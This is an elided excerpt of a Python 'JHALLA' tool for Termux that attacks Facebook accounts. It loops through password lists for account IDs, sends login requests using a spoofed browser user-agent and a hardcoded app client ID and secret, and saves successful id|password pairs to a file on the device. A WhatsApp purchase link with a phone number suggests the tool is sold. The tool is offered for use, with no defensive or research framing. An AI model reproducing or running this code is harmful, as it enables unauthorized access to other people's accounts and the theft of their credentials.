...
logo= f'''
   d88b db   db  .d8b.  db      db       .d8b.  
   `8P' 88   88 d8' `8b 88      88      d8' `8b 
    88  88ooo88 88ooo88 88      88      88ooo88 
    88  88~~~88 88~~~88 88      88      88~~~88 
db. 88  88   88 88   88 88booo. 88booo. 88   88 
Y8888P  YP   YP YP   YP Y88888P Y88888P YP   YP                                                                                                 
{50*"-"}
    Tool Version :     NONE
{50*"-"}'''
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+923435908309?text={bumper}")
                        qsbuy()
...
class crack_main():
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m [JHALLA-OK] '+iid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                elif 'www.facebook.com' in po:
                                        print(' \033[1;31m [JHALLA-CP] '+iid+' | '+pas+'\033[0;97m')
        ...
        def m2(self,iid,passlist):
                try:
                        global ok,loop,android_models
                        sys.stdout.write('\r[M2-JHALLA] %s/[OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        for pas in passlist:
                              #  pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                                client_id = '181425161904154'
                                client_secrets = '95a15d22a0e735b2983ecb9759dbaf91'
